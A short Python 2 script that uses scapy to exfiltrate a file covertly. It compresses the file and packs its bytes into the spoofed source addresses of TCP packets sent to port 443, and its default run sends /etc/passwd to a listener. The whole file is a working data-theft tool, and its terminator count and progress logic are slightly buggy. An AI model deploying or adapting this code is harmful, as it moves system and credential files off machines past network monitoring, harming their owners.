import os
import sys
import time
import zlib

from scapy.all import *

SPORT = 59943

def _list2chunks(l, n):
    """Yield successive n-sized chunks from l."""
    for i in xrange(0, len(l), n):
        yield l[i:i + n]

def _file2int(file_path):
    try:
        f = open(file_path, 'rb')
        data = f.read()
        f.close()
        comp = zlib.compress(data)
        return ' '.join(format(ord(x)) for x in comp).split(" ")
    except IOError, e:
        return False

def _send(file_path, to, sport=SPORT, dport=443):
    ips_to_send = []
    binary_array = _file2int(file_path)
    if binary_array is False:
        sys.stderr.write("Could not find file '%s'.\n" % file_path)
        sys.exit(1)
    for i in _list2chunks(binary_array, 4):
        if len(i) < 4:
            if len(i) == 1:
                ips_to_send.append("%s.255.255.255" % i[0])
            if len(i) == 2:
                ips_to_send.append("%s.%s.255.255" % (i[0], i[1]))
            if len(i) == 3:
                ips_to_send.append("%s.%s.%s.255" % (i[0], i[1], i[2]))
        else:
            ips_to_send.append("%s.%s.%s.%s" % (i[0], i[1], i[2], i[3]))

    sys.stdout.write("File '%s' had been preped for exfiltration.\n" % (file_path))
    i = 0
    sys.stdout.write("Total of %s data packets (+3 terminators).\n" % len(ips_to_send))
    percent = len(ips_to_send) / 100
    for ip in ips_to_send:
        i += 1
        a = IP(src=ip, dst=to)
        b = a/TCP(sport=sport, dport=dport, seq=4545)
        send(b, verbose=False)
        if i % percent == 0:
            sys.stdout.write(".")
            sys.stdout.flush()
    sys.stdout.write("\n")

    # Terminating buffer
    for i in range(0,2):
        a = IP(src="255.255.255.255", dst=to)
        b = a/TCP(sport=sport, dport=dport)
        send(b, verbose=False)
        time.sleep(0.01)

    sys.stdout.write("Sent out file '%s' to '%s' with total of %s packets.\n" % (file_path, to, len(ips_to_send)+3))
    return True


if __name__ == "__main__":
    sys.stdout.write("You are using source port %s. Please make sure the listener is listening on this port as well. \n" % SPORT)
    _send(file_path="/etc/passwd", to="127.0.0.1")
